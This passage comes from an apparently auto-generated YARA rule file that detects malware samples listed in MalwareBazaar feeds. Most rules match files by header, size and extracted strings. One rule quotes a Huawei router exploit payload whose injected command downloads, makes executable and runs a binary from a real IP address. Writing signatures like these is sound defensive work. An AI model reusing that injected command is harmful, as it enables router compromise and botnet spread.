        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 7503KB
        and all of them
}

rule Windows_5db6236dda5724e94a0487e1b613d5eff9c5bfa7bda4852fe8f1acbf6a03a4f0
{
    meta:
        description = "Auto ML: 5db6236dda5724e94a0487e1b613d5eff9c5bfa7bda4852fe8f1acbf6a03a4f0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6883KB
        and all of them
}

rule Windows_5ddea1187e48e56a27f1878198a899c68a4a690105eb8bc5d687a698a94d64d3
{
    meta:
        description = "Auto ML: 5ddea1187e48e56a27f1878198a899c68a4a690105eb8bc5d687a698a94d64d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ".CRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 345KB
        and all of them
}

rule Linux_5de10ea353edd3a5fe13ff5099fa7be2e638b18591301391d12c2db092a64fad
{
    meta:
        description = "Auto ML: 5de10ea353edd3a5fe13ff5099fa7be2e638b18591301391d12c2db092a64fad"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A"
        $s2 = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGH"
        $s3 = "IJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"
        $s4 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s5 = "!\"#$%&'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB
        and all of them
}

rule Linux_5df31e46f15c77096b313abf366db8a95da24d37c81be89de970a457c120c543
{
    meta:
        description = "Auto ML: 5df31e46f15c77096b313abf366db8a95da24d37c81be89de970a457c120c543"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sPb'tw"
        $s2 = "kS7AuS"
        $s3 = "hMjd4b"
        $s4 = "FZOGOP"
        $s5 = "n>onus"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB
        and all of them
}

rule Linux_5dfb8679b06594b9ad8248ebb560b2150690a47acb97a9defd6a2fda5587574e
{
    meta:
        description = "Auto ML: 5dfb8679b06594b9ad8248ebb560b2150690a47acb97a9defd6a2fda5587574e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "?iuk:b"
        $s2 = "=hO}lQ"
        $s3 = "1VN2lf"
        $s4 = "rR\\keS"
        $s5 = "bs$RSk"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 43KB
        and all of them
}

rule Linux_5e243f9c409fe775f51c874d4c71aa99b5520881f0bfefefb57a8985222b585b
{
    meta:
        description = "Auto ML: 5e243f9c409fe775f51c874d4c71aa99b5520881f0bfefefb57a8985222b585b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "D$TPhH"
        $s2 = "E$VRWP"
        $s3 = "xAPPSh@"
        $s4 = "u%WWSS"
        $s5 = "t@;D$xu"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 98KB
        and all of them
}

rule Windows_5e2e2b3309ec8c4305d437cd8d545841e15679f664c62f8c1be1fe8733d5d292
{
    meta:
        description = "Auto ML: 5e2e2b3309ec8c4305d437cd8d545841e15679f664c62f8c1be1fe8733d5d292"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 652KB
        and all of them
}

rule Windows_5e351a9f1fb3f62d980bd269a1ab3c652126861bf1d2ec773aa3be89980591a0
{
    meta:
        description = "Auto ML: 5e351a9f1fb3f62d980bd269a1ab3c652126861bf1d2ec773aa3be89980591a0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Fnnq2GMmf"
        $s5 = "jDykgUa,e3Y83jaxT9Q8XieZb8=lhlFmnq2CMmfH0cg"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 881KB
        and all of them
}

rule Windows_5e75dd408b7957d0ba77a24386535a86ce21d9642f6792b94b24b4e1539e545a
{
    meta:
        description = "Auto ML: 5e75dd408b7957d0ba77a24386535a86ce21d9642f6792b94b24b4e1539e545a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4011KB
        and all of them
}

rule Windows_5ec29e5f8023d0468f7c3d4b45003402a069c7d5017463d2dfad3fcc0f9eeeff
{
    meta:
        description = "Auto ML: 5ec29e5f8023d0468f7c3d4b45003402a069c7d5017463d2dfad3fcc0f9eeeff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2992KB
        and all of them
}

rule Windows_07b5d39b67400f7b7b3ccee2ecf254cbe564880677f14172a39255d3d5cbf4af
{
    meta:
        description = "Auto ML: 07b5d39b67400f7b7b3ccee2ecf254cbe564880677f14172a39255d3d5cbf4af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Whirtles"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 166KB
        and all of them
}

rule Linux_5ed740b343a60bf89aa5e2a8d992ff9e3fe28a9c2fab9aefee125d43e32eb732
{
    meta:
        description = "Auto ML: 5ed740b343a60bf89aa5e2a8d992ff9e3fe28a9c2fab9aefee125d43e32eb732"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Pqc$`j"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 196KB
        and all of them
}

rule Android_5f113715e47ddce3f72f9ff69b1aa07ee09225eaf6b501a7b106fa893779a931
{
    meta:
        description = "Auto ML: 5f113715e47ddce3f72f9ff69b1aa07ee09225eaf6b501a7b106fa893779a931"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "resources.arsc"
        $s3 = "res/drawable/curved_shape.xml"
        $s4 = "res/drawable/ic_empty.png"
        $s5 = "res/drawable/ic_settings.xml"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 4252KB
        and all of them
}

rule Linux_5f2ae374b655ebcbf16907a4833668cd66a659de1c46f2ad64d61bb8e85f5ef8
{
    meta:
        description = "Auto ML: 5f2ae374b655ebcbf16907a4833668cd66a659de1c46f2ad64d61bb8e85f5ef8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Kdsb3h"
        $s2 = "7^fQ(zm"
        $s3 = "q >a3RG"
        $s4 = "I+kME1"
        $s5 = "FkoE`w"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 48KB
        and all of them
}

rule Linux_5f4b7496cb2cdd38f3ea976fca429b2e87be82a2115c0b92ce95bd3dcd145ac7
{
    meta:
        description = "Auto ML: 5f4b7496cb2cdd38f3ea976fca429b2e87be82a2115c0b92ce95bd3dcd145ac7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 166KB
        and all of them
}

rule Linux_5f519e6c250c277cdde396e7ee753278897d869987cbff8ec9a8ec27ada47124
{
    meta:
        description = "Auto ML: 5f519e6c250c277cdde396e7ee753278897d869987cbff8ec9a8ec27ada47124"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "CvUPX!"
        $s2 = "c_6!T`pP"
        $s3 = "?a\"AEd+3"
        $s4 = "e8g!Dh"
        $s5 = "WzX&%hi"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 17KB
        and all of them
}

rule Windows_5f7afeeee13aaee6874a59a510b75767156f75d14db0cd4e1725ee619730ccc8
{
    meta:
        description = "Auto ML: 5f7afeeee13aaee6874a59a510b75767156f75d14db0cd4e1725ee619730ccc8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1133KB
        and all of them
}

rule Windows_5f9e934fc4a7d1f4e6e7cfccf3f072b9bb56fe83b5c70cf907502b31e9ae5e3c
{
    meta:
        description = "Auto ML: 5f9e934fc4a7d1f4e6e7cfccf3f072b9bb56fe83b5c70cf907502b31e9ae5e3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Inno[tJ"
        $s2 = "This program must be run under Win32"
        $s3 = ".rdata"
        $s4 = "P.reloc"
        $s5 = "P.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4766KB
        and all of them
}

rule Linux_5fc3b45e99c70510d9131738ad3bac6f94d624784a84e0307c5b143b4aaf651c
{
    meta:
        description = "Auto ML: 5fc3b45e99c70510d9131738ad3bac6f94d624784a84e0307c5b143b4aaf651c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ";|$(t:PPj"
        $s2 = "C)QQWP"
        $s3 = "D$$PSV"
        $s4 = "xAPPSh@V"
        $s5 = "D$,Ph$S"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 50KB
        and all of them
}

rule Linux_5fd7ce92c4663ecab8bee9277547907696ec08490e4326054d0e44c24d45867f
{
    meta:
        description = "Auto ML: 5fd7ce92c4663ecab8bee9277547907696ec08490e4326054d0e44c24d45867f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/net/route"
        $s2 = "(null)"
        $s3 = "Self Rep Fucking NeTiS and Thisity 0n Ur FuCkInG FoReHeAd We BiG L33T HaxErS"
        $s4 = "MIPSEL"
        $s5 = "/usr/bin/apt-get"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB
        and all of them
}

rule Windows_5fd81b092504cc4ddefa20f9e1dd5b6ea02db0f4b12381b58224c7ec120c19e4
{
    meta:
        description = "Auto ML: 5fd81b092504cc4ddefa20f9e1dd5b6ea02db0f4b12381b58224c7ec120c19e4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "d UUUU_`"
        $s5 = "lZ[YZ*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1547KB
        and all of them
}

rule Linux_07d65bb58f848502125920957932cd5769e3f4eda0109f9d3f5c7f7601c04247
{
    meta:
        description = "Auto ML: 07d65bb58f848502125920957932cd5769e3f4eda0109f9d3f5c7f7601c04247"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "MW~bEZ"
        $s2 = "\\~l<wcw"
        $s3 = "FZ>O S?Va>"
        $s4 = "tv.WW="
        $s5 = "i%^XWJ"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Linux_5feefcccef3ba30055e4bbe2197d4f5df9c776ca511b9ced59aef76c8adea4bc
{
    meta:
        description = "Auto ML: 5feefcccef3ba30055e4bbe2197d4f5df9c776ca511b9ced59aef76c8adea4bc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ",Qt8R<HP"
        $s2 = "Xl@~pO"
        $s3 = "DH?fsK|"
        $s4 = "iCRCSW"
        $s5 = "dPSDS+"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_5ff8b5b88ae1cd89f6f3d068f9eff75c50dcfd1f0b46ed0a45bdc3aea2721cdc
{
    meta:
        description = "Auto ML: 5ff8b5b88ae1cd89f6f3d068f9eff75c50dcfd1f0b46ed0a45bdc3aea2721cdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "com.apple.Safari"
        $s5 = "Unable to resolve HTTP prox"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 242KB
        and all of them
}

rule Linux_60207e9cbf0d178b69789174dbf3e8d0caa0af2a1bc89efa3444ac66bc85cea2
{
    meta:
        description = "Auto ML: 60207e9cbf0d178b69789174dbf3e8d0caa0af2a1bc89efa3444ac66bc85cea2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HcD$TH"
        $s2 = "HcD$0H"
        $s3 = "HcD$TA"
        $s4 = "X[]A\\A]A^A_"
        $s5 = "HcD$dH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB
        and all of them
}

rule Windows_602575847ec3c1ff6d89ec1f78db941311bcca756de620433038c9d440127f6c
{
    meta:
        description = "Auto ML: 602575847ec3c1ff6d89ec1f78db941311bcca756de620433038c9d440127f6c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2544KB
        and all of them
}

rule Linux_60465cd81a381108fe19dee84619cda10837847f9d4be8a7642dff797cc8754c
{
    meta:
        description = "Auto ML: 60465cd81a381108fe19dee84619cda10837847f9d4be8a7642dff797cc8754c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "kSXDX$P"
        $s2 = "F\"vaT\\"
        $s3 = "=yRCFt"
        $s4 = "\"R!ngb"
        $s5 = "Aj!w\"F"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1162KB
        and all of them
}

rule Windows_60a1f8c107a9dbc4b68c7bfa51e81a32307af7a0b02ba946e9632081752002af
{
    meta:
        description = "Auto ML: 60a1f8c107a9dbc4b68c7bfa51e81a32307af7a0b02ba946e9632081752002af"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6256KB
        and all of them
}

rule Windows_60bae9c9154ac01436ee1a519b4472fd3c3e73a8449086a2b60691699e03dd3c
{
    meta:
        description = "Auto ML: 60bae9c9154ac01436ee1a519b4472fd3c3e73a8449086a2b60691699e03dd3c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "d b5Xa;"
        $s5 = "N%klX+"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 898KB
        and all of them
}

rule Linux_60c417b5306cca4a717a34fdb8fca84ea38ac838c28e1426ebf08fa0a38d42aa
{
    meta:
        description = "Auto ML: 60c417b5306cca4a717a34fdb8fca84ea38ac838c28e1426ebf08fa0a38d42aa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "TXf>\"y"
        $s3 = "TXN^NuNV"
        $s4 = "OHWHQHy"
        $s5 = "NuNqNV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 82KB
        and all of them
}

rule Linux_60c64edbeb676694f8c1e581135736919951c8f48e2ee3f8c95960158879e3e7
{
    meta:
        description = "Auto ML: 60c64edbeb676694f8c1e581135736919951c8f48e2ee3f8c95960158879e3e7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/proc/"
        $s2 = "cmdline"
        $s3 = "/proc/%d/net/tcp"
        $s4 = "%*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %*s %x"
        $s5 = "/proc/%d/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB
        and all of them
}

rule Windows_60e44bcabd3bf72c06745779b94215ae112584bef323ccce564e2153c7b046be
{
    meta:
        description = "Auto ML: 60e44bcabd3bf72c06745779b94215ae112584bef323ccce564e2153c7b046be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "MSVBVM"
        $s3 = "Project1"
        $s4 = "Timer5"
        $s5 = "Timer4"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 413KB
        and all of them
}

rule Linux_07dc592b34464b73d80f96d5420db973b2129357754b62a92484ae8bdbb6e2c3
{
    meta:
        description = "Auto ML: 07dc592b34464b73d80f96d5420db973b2129357754b62a92484ae8bdbb6e2c3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "ook{so"
        $s4 = "sosaS'"
        $s5 = "c*D'sg"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Linux_60e997ee3f296c56aa3070e53668063717e82113ca49b12a1c390ea267243ad0
{
    meta:
        description = "Auto ML: 60e997ee3f296c56aa3070e53668063717e82113ca49b12a1c390ea267243ad0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AUATSH"
        $s2 = "[]A\\A]A^A_"
        $s3 = "HcD$,H"
        $s4 = "AVAUATS"
        $s5 = "X[A\\A]A^"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 101KB
        and all of them
}

rule Windows_60f351b0db70f792c111229211107802f70ca8e9ce8d6cf8c8d4cb397981d965
{
    meta:
        description = "Auto ML: 60f351b0db70f792c111229211107802f70ca8e9ce8d6cf8c8d4cb397981d965"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = "@.eh_fram"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10939KB
        and all of them
}

rule Windows_611b2a64af43864c89ae03d5c39bf91da9885f9bb1c17351ef545b783a427b4f
{
    meta:
        description = "Auto ML: 611b2a64af43864c89ae03d5c39bf91da9885f9bb1c17351ef545b783a427b4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "oXW^>Qn"
        $s5 = "bjkLgE@"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53KB
        and all of them
}

rule Windows_611fefe40b532d3d598d3738def468e0e938f5b5c1d4da297b9b659a75147149
{
    meta:
        description = "Auto ML: 611fefe40b532d3d598d3738def468e0e938f5b5c1d4da297b9b659a75147149"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6258KB
        and all of them
}

rule Windows_613dd73bd9647baa7beb0eda82ecb395e2a0cc9b7deb8654ed62de0e6971b19f
{
    meta:
        description = "Auto ML: 613dd73bd9647baa7beb0eda82ecb395e2a0cc9b7deb8654ed62de0e6971b19f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Property"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 975KB
        and all of them
}

rule Windows_6142cc637622fcb15e3bd67869c5ec28c7021d27a2bc22b73346ad9322971521
{
    meta:
        description = "Auto ML: 6142cc637622fcb15e3bd67869c5ec28c7021d27a2bc22b73346ad9322971521"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2285KB
        and all of them
}

rule Windows_616429d69e4f317b3c0a45f10489cb6182b36fe714578e6f872780b7dbe9c230
{
    meta:
        description = "Auto ML: 616429d69e4f317b3c0a45f10489cb6182b36fe714578e6f872780b7dbe9c230"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 39936KB
        and all of them
}

rule Linux_6171ae2156b798acdef94ecc13a819a81d1b2429d303457183759fcb347abc6a
{
    meta:
        description = "Auto ML: 6171ae2156b798acdef94ecc13a819a81d1b2429d303457183759fcb347abc6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HtsDG'$"
        $s2 = "'8RG;eP"
        $s3 = "a3wQgO"
        $s4 = "uZ7bwK"
        $s5 = "hsOO0C"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 19KB
        and all of them
}

rule Windows_61b8fbea8c0dfa337eb7ff978124ddf496d0c5f29bcb5672f3bd3d6bf832ac92
{
    meta:
        description = "Auto ML: 61b8fbea8c0dfa337eb7ff978124ddf496d0c5f29bcb5672f3bd3d6bf832ac92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "`@.pdata"
        $s5 = "0@.xdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8783KB
        and all of them
}

rule Windows_61c35ad089a04cf70568062f4baf424584dd034e7368292daf28e65373715df3
{
    meta:
        description = "Auto ML: 61c35ad089a04cf70568062f4baf424584dd034e7368292daf28e65373715df3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = ")q 6;E?A?F?"
        $s5 = "WA^*ET@V"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 725KB
        and all of them
}

rule Windows_07f103ec9f4cf73a1ea534a7b1fed490045e8611c14cb66dfe8784f01ea63e5c
{
    meta:
        description = "Auto ML: 07f103ec9f4cf73a1ea534a7b1fed490045e8611c14cb66dfe8784f01ea63e5c"
